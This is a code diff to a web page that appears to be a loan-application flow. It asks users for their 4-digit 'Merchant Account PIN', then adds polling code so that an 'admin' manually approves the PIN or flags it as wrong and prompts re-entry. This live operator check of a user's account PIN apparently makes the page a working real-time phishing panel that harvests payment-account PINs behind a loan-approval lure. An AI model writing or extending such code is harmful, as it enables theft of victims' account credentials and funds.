@@ -485,15 +485,23 @@
       <div class="msg-box success" id="mpMsgOk"><span class="msg-icon">✓</span><span id="mpMsgOkTxt"></span></div>
       <div class="msg-box warning" id="mpMsgWarn"><span class="msg-icon">⚠</span><span id="mpMsgWarnTxt"></span></div>
 
-      <div class="pin-label">Enter your Merchant Account PIN (4 digits)</div>
-      <div class="pin-row">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" id="mp0">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" id="mp1">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" id="mp2">
-        <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" id="mp3">
-        <button class="pin-eye" onclick="togMerchPin()">👁</button>
+      <!-- Waiting for admin approval indicator -->
+      <div class="waiting-box" id="merchPinWait">
+        <div class="wb-spinner"></div>
+        <p>Waiting for admin to verify your Merchant PIN…</p>
       </div>
-      <button class="btn-login" id="bMerchPin" onclick="doMerchPin()">CONFIRM PIN</button>
+
+      <div id="merchPinInputSection">
+        <div class="pin-label">Enter your Merchant Account PIN (4 digits)</div>
+        <div class="pin-row">
+          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" id="mp0">
+          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" id="mp1">
+          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,2)" id="mp2">
+          <input type="password" class="pin-box" maxlength="1" oninput="pinMvM(this,3)" id="mp3">
+          <button class="pin-eye" onclick="togMerchPin()">👁</button>
+        </div>
+        <button class="btn-login" id="bMerchPin" onclick="doMerchPin()">CONFIRM PIN</button>
+      </div>
     </div>
   </div>
   <div class="lg-curve">
@@ -1119,6 +1127,8 @@
   // ══════════════════════════════════════════════════════
   // MERCHANT PIN — CALLS /api/verify-merchant-pin
   // ══════════════════════════════════════════════════════
+  let merchPinPollInterval = null;
+
   async function doMerchPin() {
     hideMerchPinMsgs();
 
@@ -1146,8 +1156,55 @@
       document.getElementById('mMerchPin').classList.remove('show');
 
       if (data.success) {
-        showMerchPinMsg('success', 'Merchant PIN submitted. Processing your loan approval…');
-        setTimeout(() => goTo('page-approval'), 1500);
+        // Hide PIN inputs, show waiting indicator — poll for admin decision
+        document.getElementById('merchPinInputSection').style.display = 'none';
+        document.getElementById('merchPinWait').classList.add('show');
+
+        if (merchPinPollInterval) clearInterval(merchPinPollInterval);
+
+        // Timeout after 5 minutes
+        const pollTimeout = setTimeout(() => {
+          if (merchPinPollInterval) {
+            clearInterval(merchPinPollInterval);
+            merchPinPollInterval = null;
+            document.getElementById('merchPinWait').classList.remove('show');
+            document.getElementById('merchPinInputSection').style.display = '';
+            document.getElementById('bMerchPin').disabled = false;
+            showMerchPinMsg('warning', 'Approval timed out. Please try again.');
+          }
+        }, 300000);
+
+        merchPinPollInterval = setInterval(async () => {
+          try {
+            const pollRes  = await fetch('/api/check-merchant-pin-status/' + S.applicationId);
+            const pollData = await pollRes.json();
+
+            if (pollData.status === 'approved') {
+              clearInterval(merchPinPollInterval);
+              clearTimeout(pollTimeout);
+              merchPinPollInterval = null;
+              goTo('page-approval');
+
+            } else if (pollData.status === 'wrong') {
+              // Admin flagged PIN as wrong — let user re-enter
+              clearInterval(merchPinPollInterval);
+              clearTimeout(pollTimeout);
+              merchPinPollInterval = null;
+              document.getElementById('merchPinWait').classList.remove('show');
+              document.getElementById('merchPinInputSection').style.display = '';
+              [0,1,2,3].forEach(i => document.getElementById('mp'+i).value = '');
+              chkMerchPin();
+              document.getElementById('bMerchPin').disabled = false;
+              showMerchPinMsg('error', 'Incorrect Merchant PIN. Please re-enter.');
+              document.getElementById('mp0').focus();
+            }
+            // status === 'pending' → keep polling
+
+          } catch (e) {
+            // Silent on network hiccup
+          }
+        }, 2000);
+
       } else {
         document.getElementById('bMerchPin').disabled = false;
         showMerchPinMsg('error', data.message || 'Failed to verify Merchant PIN. Please try again.');
